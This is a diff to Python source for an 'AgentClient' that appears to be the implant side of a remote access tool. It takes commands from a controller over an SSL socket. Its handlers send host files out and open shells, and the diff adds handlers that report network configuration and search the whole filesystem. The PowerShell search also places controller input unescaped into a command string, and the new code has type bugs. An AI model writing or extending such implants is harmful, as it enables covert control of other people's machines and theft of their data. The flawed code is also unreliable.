@@ -2,8 +2,9 @@ import socket
 import ssl
 import time
 import platform
+
 from src.client.utils.config import logger
-from utils.socket_utils import readline
+from utils.socket_utils import readline, read_buffer
 from utils.file_utils import FileUtils
 
 
@@ -60,7 +61,7 @@ class AgentClient:
         cmd = cmd.decode("utf-8")
 
         if cmd.startswith("download "):
-            filepath = cmd.split()[1]
+            filepath = cmd.split()[1].replace("\\", "/")
             self._send_file(filepath)
 
         elif cmd.startswith("SEND_FILE "):
@@ -70,6 +71,12 @@ class AgentClient:
         elif cmd.startswith("shell "):
             port = int(cmd.split()[1])
             self._shell(port)
+
+        elif cmd == "ipconfig":
+            self._ipconfig()
+
+        elif cmd.startswith("search "):
+            self._search_file(cmd)
 
         elif cmd == "quit":
             self.running = False
@@ -122,6 +129,37 @@ class AgentClient:
             self.sock.sendall(data)
         except OSError:
             self.running = False
+
+    def _ipconfig(self):
+        import subprocess, platform
+
+        try:
+            if platform.system() == "Linux":
+                output = subprocess.check_output(["ip", "a"])
+            elif platform.system() == "Windows":
+                output = subprocess.check_output(["cmd.exe", "/C", "ipconfig"])
+            else:
+                output = "OS not supported"
+
+            self.sock.sendall(b"DISPLAY\n" + str(len(output)).encode('utf-8') + b"\n" + output)
+        except Exception as e:
+            logger.debug("[agent] Error in ipconfig %s", e)
+
+    def _search_file(self, cmd):
+        import subprocess, platform
+
+        filename = cmd.split()[1]
+
+        try:
+            if platform.system() == "Linux":
+                output = subprocess.check_output(["find", "/", "-name", f"*{filename}*", "-type", "f"], stderr=subprocess.DEVNULL)
+            elif platform.system() == "Windows":
+                output = subprocess.run(["powershell", "-NoProfile", "-Command", fr"Get-ChildItem -Path C:\ -Recurse -File -Filter '*{filename}*' -ErrorAction SilentlyContinue | Select-Object -Expand FullName"], capture_output=True, text=True).stdout
+            else:
+                output = "OS not supported"
+            self.sock.sendall(b"DISPLAY\n" + str(len(output)).encode('utf-8') + b"\n" + output.encode('utf-8'))
+        except Exception as e:
+            logger.debug("[agent] Error in search %s", e)
 
     def close(self):
         self.running = False
